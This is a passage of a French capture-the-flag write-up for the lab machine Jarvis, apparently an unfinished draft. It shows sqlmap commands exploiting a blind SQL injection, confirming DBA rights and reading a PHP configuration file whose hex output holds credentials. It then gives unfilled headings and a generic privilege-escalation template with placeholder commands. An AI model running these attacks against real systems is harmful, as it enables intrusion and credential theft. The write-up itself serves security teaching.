Tu réutilises les mêmes paramètres afin de conserver une détection stable et de limiter le nombre de requêtes envoyées au serveur, puis tu ajoutes `-D hotel` et `--tables` :

```bash
sqlmap \
  -u 'http://jarvis.htb/room.php?cod=2' \
  -p cod \
  --dbms=MySQL \
  --technique=B \
  --level=1 \
  --risk=1 \
  --threads=1 \
  --delay=1 \
  --batch \
  -D hotel \
  --tables
```

L’option `-D hotel` indique à `sqlmap` de travailler sur la base `hotel`, tandis que `--tables` lui demande d’en récupérer la liste des tables.

Comme précédemment, l’extraction repose sur une injection **boolean-based blind**. Le nom des tables est donc reconstruit progressivement, caractère par caractère, ce qui rend l’opération relativement lente.

La sortie obtenue met en évidence une seule table :

```
Database: hotel
[1 table]
+------+
| room |
+------+
```

La base `hotel` contient donc uniquement la table `room`. 

Le nom de cette table correspond directement au fonctionnement observé dans l’application : les pages `room.php` affichent les informations des chambres en fonction de la valeur transmise au paramètre `cod`. 

Cette table semble donc surtout contenir les données utilisées pour alimenter les pages publiques du site. Il est peu probable qu’elle fournisse directement des informations sensibles comme des identifiants ou des mots de passe. 

La prochaine étape consiste plutôt à identifier le compte MySQL utilisé par l’application, puis à examiner les privilèges dont il dispose.

#### Identification de l’utilisateur MySQL

Après avoir identifié la base courante et les tables qu’elle contient, tu peux maintenant déterminer quel compte MySQL est utilisé par l’application et vérifier s’il dispose de privilèges élevés. 

Tu conserves les mêmes paramètres que précédemment et tu ajoutes l’option `--is-dba`. Lors de cette vérification, `sqlmap` affiche également l’identité de l’utilisateur MySQL courant.

```bash
sqlmap \
  -u 'http://jarvis.htb/room.php?cod=2' \
  -p cod \
  --dbms=MySQL \
  --technique=B \
  --string='Suite room is perfect' \
  --level=1 \
  --risk=1 \
  --threads=1 \
  --delay=1 \
  --batch \
  --flush-session \
  --is-dba
```

L’option `--is-dba` demande à `sqlmap` de vérifier si le compte MySQL utilisé par l’application possède les privilèges DBA. Il n’est pas nécessaire de préciser le nom de cet utilisateur, car l’outil interroge directement le contexte de la session SQL vulnérable.

Lors de cette vérification, `sqlmap` récupère également l’identité de l’utilisateur courant, ce qui permet d’obtenir les deux informations au cours de la même exécution.

L’option `--string='Suite room is perfect'` fournit à `sqlmap` un marqueur caractéristique d’une réponse vraie. Cette chaîne avait été repérée lors de la détection précédente, puis vérifiée manuellement dans la page retournée pour `cod=2`. Elle permet de stabiliser la comparaison des réponses malgré le mécanisme de protection du site.

L’extraction reste relativement lente, car l’injection est de type **boolean-based blind**. `sqlmap` doit reconstruire les informations caractère par caractère en envoyant plusieurs conditions vraies ou fausses.

La sortie permet d’obtenir les deux résultats suivants :

```
current user: 'DBadmin@localhost'
current user is DBA: True
```

Le compte MySQL utilisé par l’application est donc `DBadmin@localhost`. Le suffixe `@localhost` indique que ce compte se connecte localement au serveur de base de données.

Son nom laissait déjà penser qu’il pouvait disposer de privilèges élevés, mais le résultat suivant en apporte cette fois la confirmation :

```
current user is DBA: True
```

Le compte utilisé par l’application possède donc les privilèges DBA `Data Base Administrtor`. 

Cette situation ouvre des possibilités d’exploitation plus intéressantes que la simple lecture des données de la base.

#### Lecture du fichier `connection.php`

Les privilèges DBA du compte `DBadmin@localhost` peuvent offrir des possibilités qui dépassent l’énumération des données contenues dans MySQL. Tu peux notamment vérifier si ce compte permet de lire des fichiers locaux accessibles au serveur de base de données.

L’application étant développée en PHP et connectée à MySQL, ses fichiers de configuration constituent une cible intéressante. Ils peuvent contenir les paramètres utilisés pour établir la connexion à la base de données.

La prochaine étape consiste donc à tenter de récupérer le fichier `connection.php`.

```bash
sqlmap \
  -u 'http://jarvis.htb/room.php?cod=2' \
  -p cod \
  --dbms=MySQL \
  --technique=B \
  --threads=1 \
  --delay=1 \
  --timeout=20 \
  --retries=5 \
  --disable-precon \
  --batch \
  --file-read=/var/www/html/connection.php
```



```bash
         ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.6#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:04:27 /2026-07-13/

[16:04:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i3cq22355be...m0gqu6r233'). Do you want to use those [Y/n] Y

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=2 AND 2849=2849
---

[16:04:28] [INFO] testing MySQL
[16:04:28] [INFO] confirming MySQL
[16:04:28] [INFO] the back-end DBMS is MySQL

web server operating system: Linux Debian 9 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.0

[16:04:28] [INFO] fingerprinting the back-end DBMS operating system
[16:04:28] [INFO] the back-end DBMS operating system is Linux
[16:04:28] [INFO] fetching file: '/var/www/html/connection.php'
[16:04:28] [INFO] resuming partial value: 3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C6928273132372E302
[16:04:28] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[16:04:28] [INFO] retrieved: E302E31272C27444261646D696E272C27696D697373796F75272C27686F74656C27293B0A3F3E0A

do you want confirmation that the remote file '/var/www/html/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y

[16:11:24] [INFO] retrieved: 75
[16:11:38] [INFO] the local file '/home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php' and the remote file '/var/www/html/connection.php' have the same size (75 B)

files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php (same file)

[16:11:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'

[*] ending @ 16:11:38 /2026-07-13/
```



### Exploitation de l’injection SQL pour obtenir une exécution de commandes

#### Vérification des privilèges du compte MySQL

#### Écriture d’un fichier PHP dans la racine web

#### Validation de l’exécution du fichier PHP

### Obtention d’un reverse shell en tant que `www-data`

#### Mise en écoute sur Kali avec rlwrap et netcat

#### Déclenchement du reverse shell

#### Vérification du contexte d’exécution

#### Stabilisation du reverse shell

### Recherche d’un passage vers un utilisateur local

#### Consultation des permissions sudo de `www-data`

#### Découverte du script `simpler.py`

#### Analyse du fonctionnement du script

#### Identification d’une injection de commandes

### Exploitation de `simpler.py`

#### Exécution du script avec les droits de `pepper`

#### Contournement du filtrage des commandes

#### Obtention d’un shell en tant que `pepper`

### Validation de l’accès utilisateur

#### Vérification de l’identité et du répertoire personnel

#### Lecture de `user.txt`


---

## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}


### Observation passive avec pspy64

```bash
./pspy64
```

Si système 32 bits :

```bash
./pspy32
```

### Vérification sudo

```bash
sudo -l
```

### Exploration du contexte utilisateur

```bash
whoami
id
pwd
uname -a
hostname
find /home /opt -type f -readable 2>/dev/null
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

### SUID

```bash
python3 suid3num.py
```

Alternative :

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Services locaux

```bash
ss -tulnp
```

Alternative :

```bash
netstat -tulnp
```

### Recherche d’un service derrière un port local

Exemple avec le port `8080` :

```bash
grep -r ':8080' /etc 2>/dev/null
```

Recherche élargie :

```bash
grep -r '8080' /etc 2>/dev/null
```

### Tunnel SSH vers un service local

Exemple avec un service local sur `127.0.0.1:8080` :

```bash
ssh -L 8080:127.0.0.1:8080 user@target
```

Accès depuis Kali :

```text
http://localhost:8080
```

### Linpeas

```bash
./linpeas.sh
```

### Dernier recours : le kernel

```bash
uname -a
./les.sh
```

### Conclusion de l’énumération privilege escalation

À la fin de cette phase, tu peux résumer les pistes testées :

* sudo
* contexte utilisateur
* fichiers lisibles
* capabilities
* SUID
* cron et timers
* services locaux
* LinPEAS
* kernel

Dans ce cas précis, la piste exploitable est :

```text
<résumer ici la piste réellement exploitée>
```

### Exploitation de la piste identifiée

Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.

```bash
<commandes d’exploitation>
```

Tu confirmes l’élévation de privilèges :

```bash
whoami
id
hostname
```

Résultat attendu :

```text
root
uid=0(root) gid=0(root) groups=0(root)
machine
```

### root.txt

Une fois root, tu peux lire le flag final :

```bash
cat /root/root.txt
```

Cette étape termine l’escalade de privilèges.

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}